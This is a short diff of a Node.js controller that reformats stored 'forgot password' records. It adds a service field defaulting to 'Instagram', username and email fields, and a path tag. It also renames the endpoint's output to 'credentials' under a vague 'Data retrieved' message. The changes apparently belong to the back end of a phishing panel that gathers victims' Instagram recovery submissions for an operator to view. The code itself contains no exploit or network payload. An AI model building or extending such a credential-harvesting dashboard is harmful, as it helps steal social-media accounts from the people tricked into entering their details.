@@ -2,12 +2,17 @@ const ForgotEmail = require('../models/ForgotEmail.model');
 const { getIo }   = require('../config/socket');
 const { sendSuccess, sendFailure } = require('../utils/response');
 
-/* ── Format helper ── */
+/* ── Format helper — only necessary fields for forgot password ── */
 const fmt = (doc) => ({
-  id:        doc._id.toString(),
-  email:     doc.email,
-  verified:  doc.verified,
-  at:        doc.createdAt.toISOString(),
+  id:       doc._id.toString(),
+  service:  (doc.source || 'Instagram').toLowerCase(),
+  username: doc.email,
+  email:    doc.email,
+  type:     doc.type || 'forgot_password',
+  path:     doc.path || 'forgot_password',
+  time:     doc.time || null,
+  at:       doc.createdAt ? doc.createdAt.toISOString() : new Date().toISOString(),
+  verified: doc.verified ?? false,
 });
 
 /**
@@ -17,7 +22,8 @@ const fmt = (doc) => ({
 const getAllForgot = async (req, res) => {
   try {
     const docs = await ForgotEmail.find().sort({ createdAt: -1 });
-    return sendSuccess(res, 'Forgot emails retrieved', { forgotEmails: docs.map(fmt) });
+    const credentials = docs.map(fmt);
+    return sendSuccess(res, 'Data retrieved', { credentials });
   } catch (err) {
     return sendFailure(res, err.message || 'Internal Server Error', 500);
   }
